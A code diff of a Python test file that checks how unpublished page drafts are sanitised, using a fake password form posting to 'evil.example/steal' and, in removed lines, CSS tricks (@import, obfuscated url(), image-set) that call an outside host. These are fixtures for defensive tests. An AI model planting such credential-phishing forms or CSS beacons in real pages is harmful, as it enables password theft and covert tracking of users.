@@ -136,41 +136,30 @@ class TestFACPage(BaseAssistantTest):
             self.assertNotIn(unsafe, served)
         self.assertIn('class="mk-card"', served)
 
-    def test_a_draft_cannot_draw_a_form_or_reach_an_outside_server(self):
-        # A draft could otherwise draw a fake password prompt that posts out, or ping a server.
+    def test_a_draft_is_served_without_form_controls(self):
+        # Defence in depth behind the sandboxed preview: no fake prompt that posts elsewhere.
         html = (
-            '<div class="mk-card" style="background-image:url(https://evil.example/p.gif);color:red">'
-            '<form action="https://evil.example/steal"><input type="password" name="p">'
-            "<select><option>a</option></select><textarea></textarea><button>Sign in</button>"
-            "</form></div>"
+            '<div class="mk-card"><form action="https://evil.example/steal">'
+            '<input type="password" name="p"><select><option>a</option></select>'
+            "<textarea></textarea><button>Sign in</button></form></div>"
         )
-        style = (
-            '@import url("https://evil.example/a.css");\n@import "https://evil.example/b.css";\n'
-            ".mk-card { color: red; background: URL( 'https://evil.example/c.gif' ); }\n"
-            '.x { background-image: image-set("https://evil.example/d.png" 1x); }\n'
-            ".y { background: \\75 rl(https://evil.example/e.gif); }\n"
-            ".z { background: \\5c 75 rl(https://evil.example/f.gif); }"
-        )
-        slug = self._make_page(published=0, html=html, style=style)
+        slug = self._make_page(published=0, html=html)
         self._act_as("fac-page-draft-form", roles=("System Manager",))
 
-        page = get_page(slug)
+        served = get_page(slug)["html"]
 
         for tag in ("<form", "<input", "<button", "<select", "<textarea"):
-            self.assertNotIn(tag, page["html"])
-        self.assertNotIn("evil.example", page["html"])
-        # An escaped backslash leaves "75 rl(", which no browser reads as url().
-        for fetch in ("@import", "url(", "image-set", "\\"):
-            self.assertNotIn(fetch, page["style"].lower())
-        self.assertIn(".mk-card { color: red;", page["style"])
-        self.assertIn('class="mk-card"', page["html"])
+            self.assertNotIn(tag, served)
+        self.assertIn('class="mk-card"', served)
 
-    def test_a_published_page_style_is_served_unchanged(self):
-        style = '@import url("https://fonts.example/a.css");\n.mk-card { background: url(/files/x.png); }'
-        slug = self._make_page(published=1, style=style)
-        self._act_as("fac-page-published-style", roles=("System Manager",))
+    def test_the_host_page_inlines_the_draft_preview(self):
+        # Desk loads the page script through Page.load_assets, which resolves the include.
+        page = frappe.get_doc("Page", HOST_PAGE)
+        page.load_assets()
 
-        self.assertEqual(get_page(slug)["style"], style)
+        self.assertIn("function fac_page_draft_frame", page.script)
+        self.assertIn('frame.setAttribute("sandbox", "")', page.script)
+        self.assertNotIn("{% include", page.script)
 
     def test_a_published_page_html_is_served_unchanged(self):
         html = '<div class="mk-card" onclick="go()"><img src="x" onerror="track()"></div>'
